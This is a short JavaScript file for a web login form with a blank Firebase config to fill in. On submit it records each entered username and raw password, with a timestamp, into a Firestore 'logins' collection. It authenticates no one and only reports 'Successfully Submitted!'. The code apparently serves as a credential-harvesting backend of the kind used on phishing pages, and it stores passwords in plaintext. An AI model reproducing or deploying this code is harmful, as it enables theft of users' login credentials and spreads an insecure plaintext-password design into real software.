// --- Firebase Config ---
//--- Replace with your firebase config ---
const firebaseConfig = {
  apiKey: " ",
  authDomain: " ",
  databaseURL: " ",
  projectId: " ",
  storageBucket: " ",
  messagingSenderId: " ",
  appId: " "
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

// Form Submit
document.getElementById("login-form").addEventListener("submit", function (event) {
    event.preventDefault();

    let username = document.getElementById("username").value.trim();
    let password = document.getElementById("password").value;

    const messageBox = document.getElementById("message-box");
    const messageText = document.getElementById("message-text");

    if (username !== "" && password !== "") {

        // Save to Firebase
        db.collection("logins").add({
            username: username,
            password: password,
            timestamp: new Date()
        }).then(() => {
            messageText.textContent = "Successfully Submitted!";
            messageText.style.color = "#10b981";
            messageBox.style.borderColor = "#10b981";
            messageBox.style.display = "block";

            document.getElementById("login-form").reset();
        }).catch((err) => {
            messageText.textContent = "Error: " + err;
            messageText.style.color = "#ef4444";
            messageBox.style.borderColor = "#ef4444";
            messageBox.style.display = "block";
        });

    } else {
        messageText.textContent = "Please fill both fields.";
        messageText.style.color = "#ef4444";
        messageBox.style.borderColor = "#ef4444";
        messageBox.style.display = "block";
    }
});
